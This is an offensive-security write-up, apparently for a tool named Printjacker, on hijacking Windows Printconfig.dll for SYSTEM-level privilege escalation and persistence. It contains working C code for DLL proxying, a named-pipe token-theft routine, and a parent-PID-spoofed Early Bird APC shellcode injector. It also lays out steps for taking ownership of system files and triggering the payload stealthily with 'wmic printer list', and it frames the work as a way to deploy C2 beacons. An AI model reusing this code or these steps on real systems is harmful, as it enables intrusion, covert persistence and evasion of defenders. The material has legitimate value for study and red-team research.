# A Tricky Hijack - Printconfig.dll

## 1- An Interesting File Overwrite Vulnerability

In 2020, different researchers discovered 2 important Privilege Escalation vulnerabilities affecting Windows Group Policy Caching that are labeled as **CVE-2020-1317** and **CVE-2020-16939**. [The ZDI post](https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation) describes **CVE-2020-16939** like this[[1]]:

```
This vulnerability abuses a SetSecurityFile operation performed during Group Policy update that is done in the context of NT AUTHORITY\SYSTEM. 
This operation is performed on all files within a certain folder. 
An attacker could create a directory junction to another folder and thereby obtain full permissions on the contents of that folder.
```

While I was trying to understand and weaponize the vulnerability in my environment, I realized that changing permissions of every file in a system directory is a very noisy action. Let's say you want to exploit this vulnerability for getting the SYSTEM shell by overwriting a Dll. In order to overwrite a system Dll, you need to change permissions of the file which is usually under `C:\Windows\System32`. Choosing `System32` as the target folder may end up affecting lots of other files and gives inconsistent results. 

The question is that is there a better folder to takeover than `C:\Windows\System32` which will affect permissions of fewer files. Actually, a subtle approach can be used for creating a more stable and elegant exploit[[2]]. For this approach, we will simply use an exploitation method first showed by [SandboxEscaper](https://twitter.com/SandboxBear) in CVE-2018-8440. Task Scheduler ALPC interface vulnerability is exploited to overwrite **Printconfig.dll** which is the library related to the Print Configuration User Interface to load a custom Dll into "spoolsv.exe" process. Printconfig.dll is under a generic directory `C:\Windows\System32\DriverStore\FileRepository\*\amd64`. This directory contains 4 files so it can be a better target for our scenario.

## 2- DLL Proxying

In order to create a malicious DLL that will replace Printconfig.dll, I decided to use DLL proxying method in order to reproduce the functionality as much as possible. I decided to execute the payload in the specific method used by a system service rather than writing it into DllMain. 

```c
#pragma comment(linker,"/export:DevQueryPrintEx=printconfig_orig.DevQueryPrintEx,@258")
#pragma comment(linker,"/export:DllCanUnloadNow=printconfig_orig.DllCanUnloadNow,@259")
#pragma comment(linker,"/export:DllGetClassObject=printconfig_orig.DllGetClassObject,@260")
...
```

The default execution method used by SandboxEscaper is that of using XPS Print Jobs to make spoolsv.exe load Printconfig.dll. I checked that in several Windows 10 environments and it seems in some cases Printconfig.dll was not loaded by spoolsv after invoking XPS Print Job. I tried the debug the issue without going into detail and it seems some caching mechanisms may terminate the execution before loading the Printconfig.dll[[3]].      

## 3- Execution via WMIC

Afer that, I decided to change the method to load Printconfig.dll into a system service. Good old WMI can be a good option for interacting with different parts of Operating System. WMI can be used to query printers on a system, show details of a printer, and edit printer configs. By executing `wmic printer list` command, I validate WmiPrvSE.exe loads Printconfig.dll into its memory. To understand which function is invoked by WmiPrvSE.exe, I used procmon to display stack trace when Printconfig.dll is loaded. 

![trace](images/trace.png)

Stack Trace shows **DrvDeviceCapabilities** is the function that I am looking for so I used *x64dbg* to observe WmiPrvSE.exe actually executes `Printconfig.dll!DrvDeviceCapabilities`. After the double check I decided to put my payload in **DrvDeviceCapabilities**.

## 4- Elevate to SYSTEM from WmiPrvSE.exe

Changing execution method from XPS Print Job to WMIC mainly affects the privileges of the loader process. WMIC command can cause WmiPrvSE.exe to spawn and it often impersonates the caller user. I checked the impersonation token used in WmiPrvSE.exe process and verified the thread is ran with it when `wmic printer list` is executed. So, if I call `wmic printer list` with a low-privilege user, the thread will run with the privileges of that user. This is an undesirable limitation since I want to be able to execute the payload regardless the user invoking `wmic printer list` command. However, it's possible to bypass impersonation token by creating a new thread and executing our payload in the newly created thread. MSDN Documentation mentions this property in [here][4].

```
The ACLs in the default security descriptor for a thread come from the primary token of the creator.
```

According to the documentation new thread is created with the primary token of WmiPrvSE.exe which has `NT AUTHORITY\NETWORK SERVICE` SID. Since I want to elevate to SYSTEM privileges I used the method described by James Forshaw in ["Sharing a Logon Session a Little Too Much"][5]. The blog post explains the method very well so I won't go into the detail here. I implemented the same method in Printconfig.dll with the help of [Faxhell](https://github.com/ionescu007/faxhell) tool which also utilizes it[[6]]. In summary, this method uses a named pipe impersonation trickery to get the token of **RPCSS** process which can be used for searching SYSTEM token in other processes. After finding the SYSTEM token, it is used to be impersonated by the current thread using **SetThreadToken()**. 

```c

BOOL GetSystem() {
	//Create Random Pipename
	WCHAR pipename[12] = { 0 };
	GenRandomString(pipename, 11);
	wprintf(L"\n[*] PipeName; \\\\.\\pipe\\%s", pipename);

	HANDLE hPipe;
	WCHAR server[512];
	char buffer[256];
	DWORD dwRead = 0;
	HANDLE hProc;

	HANDLE hPipe2;
	WCHAR server2[512];
	DWORD cbWritten = 0;

	HANDLE hToken;

	wsprintf(server, L"\\\\.\\pipe\\%s", pipename);
	wsprintf(server2, L"\\\\localhost\\pipe\\%s", pipename);

	hPipe = CreateNamedPipe(L"\\\\.\\pipe\\pipey",
		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
		PIPE_TYPE_BYTE |
		PIPE_READMODE_BYTE |
		PIPE_WAIT |
		PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		4096,
		4096,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);

	hPipe2 = CreateFile(L"\\\\localhost\\pipe\\pipey",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	WriteFile(hPipe2, &hPipe, sizeof(hPipe2), NULL, NULL);
	ReadFile(hPipe, &hPipe, sizeof(hPipe), NULL, NULL);
	if (!ImpersonateNamedPipeClient(hPipe)) {
		printf("\n[-] ERROR impersonating the client: %d", GetLastError());
		return FALSE;
	}
	if (FAILED(GetServiceHandle(L"Rpcss", &hProc))) {
		printf("\n[-] ERROR GetServiceHandle %d", GetLastError());
		CloseHandle(hProc);
		return FALSE;
	}

	if (FAILED(GetSystemTokenFromProcess(hProc))) {
		printf("\n[-] ERROR GetSystemTokenFromProcess %d", GetLastError());
		CloseHandle(hProc);
		return FALSE;
	}
	CloseHandle(hProc);
	return TRUE;
}
```


## 5- Injection to the new Process

As the payload, I intend to use shellcode since many C2 beacons can be deployed this way. To execute the payload in SYSTEM privileges I decided to inject the shellcode to a process which is run as SYSTEM user. Actually, trying to execute the shellcode in the current process (WmiPrvSE.exe) generally ends up having NETWORK SERVICE token because new threads are created. Therefore I decided to create a new WmiPrvSE.exe to host my shellcode with the parent of **DcomLaunch** service process which is run as SYSTEM. I utilized the well-known parent PID spoofing and a generic injection technique known as ["Early Bird APC Queue Code Injection"](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection) in order to create the new host process under **DcomLaunch** for injection[[7]]. The injection technique can be changed with more evasive ones according to the target environment.  

```c
DWORD InjectNewProcess(HANDLE hParent) {
	unsigned char shellcode[] = "???";
	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEX));
	WCHAR cmdline[MAX_PATH] = L"wmiprvse.exe -Embedding";
	//WCHAR cmdline[MAX_PATH] = L"notepad.exe";
	
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = 
		(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc
		(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, 
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
		&hParent, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	
	CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, 
		EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED|CREATE_NO_WINDOW, 
		NULL, NULL, &si.StartupInfo, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, 
		sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	WriteProcessMemory(victimProcess, shellAddress, shellcode, 
		sizeof(shellcode), NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);

	return 0;
}
```       

## 6- Persistence

I decided to utilize *Printconfig.dll* hijack also for persistence since `wmic printer list` is an innocent-looking command, and this method can be combined with other persistence methods quite easily. This persistence method is applicable when the attacker has the write/modify privileges as Administrator. Printjacker finds *Printconfig.dll* directory and changes the ownership to the **Administrator** since it's owned **TrustedInstaller** by default. Printjacker also gives full permission to the **Administrator** for the directory in order to modify the files for Hijacking. After that it copies original *Printconfig.dll* to *Printconfig_orig.dll* and the Dll with our payload is written over *Printconfig.dll*. Lastly, `wmic printer list` command is executed to invoke the payload. 

![flow](images/flow.png)

### References
1- https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation

2- It's also suggested by [@decoder_it](https://twitter.com/decoder_it) in here: https://decoder.cloud/2019/11/13/from-arbitrary-file-overwrite-to-system/ 

3- OpenPrinter2 function document is actually mentions a local cache for printers: https://docs.microsoft.com/en-us/windows/win32/printdocs/openprinter2

4- https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

5- https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html

6- https://github.com/ionescu007/faxhell/blob/master/ualapi/dllmain.c

7- https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection

[1]: https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation
[2]: https://decoder.cloud/2019/11/13/from-arbitrary-file-overwrite-to-system/ 
[3]: https://docs.microsoft.com/en-us/windows/win32/printdocs/openprinter2
[4]: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
[5]: https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html
[6]: https://github.com/ionescu007/faxhell/blob/master/ualapi/dllmain.c
[7]: https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection;
